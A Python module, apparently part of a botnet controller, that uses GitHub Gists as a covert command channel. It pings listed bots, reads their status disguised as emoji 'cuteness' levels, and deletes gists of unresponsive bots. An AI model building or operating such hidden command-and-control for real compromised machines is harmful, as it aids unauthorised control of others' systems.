import random
import sys

import gist
import emojis


def send(gist_api, bot_list):
    """
    Send ping command to all the bots. And add reset emoji to all the bots' status (level of cuteness).

    :param gist_api:
    :param bot_list:
    :return: None
    """
    bot_list_content = gist.get_raw(gist_api, bot_list)
    lines = bot_list_content.split('\n')
    print("SENDING PING TO BOTS", file=sys.stderr, end="")
    for line in lines:
        if not line.startswith('###'):
            continue

        gist.send_command(gist_api, 'ping', line.split("(")[1].split("#")[1].rstrip(')', ), debug=False)

    print(file=sys.stderr)


def check(gist_api, bot_list):
    """
    Check status code (level of cuteness) -> if still reset -> kill them

    :param gist_api:
    :param bot_list:
    :return: None
    """
    new_bot_list_split = []
    bot_list_content = gist.get_raw(gist_api, bot_list)
    bot_list_split = bot_list_content.split('\n')
    for line in bot_list_split:
        if not line.startswith('###'):
            new_bot_list_split.append(line)
            continue

        # Check status
        filename = line.split("(")[1].split("#")[1].rstrip(')')
        bot_content = gist.get_raw(gist_api, filename)
        status = bot_content.split('\n')[1].split("cuteness")[-1].strip()
        if status in emojis.status_code['reset']:
            # DEAD -> KILL IT (remove post, do not add to bot list)
            print("REMOVING {}".format(filename), file=sys.stderr)
            gist_api.delete_gist(gist_id=line.split("(")[1].split("#")[0].split("/")[-1])
        else:
            new_bot_list_split.append(line)

    # Update bot list
    if len(new_bot_list_split) != len(bot_list_split):
        gist.update_gist(gist_api, bot_list, "\n".join(new_bot_list_split))

    print("##### {} BOTS STILL ALIVE #####".format(len(new_bot_list_split) - 1), file=sys.stderr)


